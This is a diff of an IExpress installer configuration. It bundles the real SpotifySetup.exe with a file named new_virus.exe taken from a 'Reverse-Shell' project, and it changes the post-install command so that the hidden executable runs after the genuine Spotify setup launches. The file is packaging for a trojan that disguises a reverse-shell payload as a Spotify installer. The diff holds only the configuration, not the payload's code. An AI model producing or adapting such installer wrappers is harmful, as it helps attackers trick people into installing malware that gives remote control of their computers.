@@ -25,21 +25,17 @@ InstallPrompt=
 DisplayLicense=
 FinishMessage=
 TargetName=C:\Users\User\Desktop\new_virus_installer.EXE
-FriendlyName=Spotify
+FriendlyName=Reverse Shell
 AppLaunched=SpotifySetup.exe
-PostInstallCmd=cmd /c installer.bat
+PostInstallCmd=new_virus.exe -i
 AdminQuietInstCmd=
 UserQuietInstCmd=
 FILE0="SpotifySetup.exe"
 FILE1="new_virus.exe"
-FILE2="installer.bat"
 [SourceFiles]
 SourceFiles0=C:\Users\User\Desktop\
 SourceFiles1=C:\Users\User\Desktop\Reverse-Shell\dist\
-SourceFiles2=C:\Users\User\Desktop\Reverse-Shell\
 [SourceFiles0]
 %FILE0%=
 [SourceFiles1]
 %FILE1%=
-[SourceFiles2]
-%FILE2%=
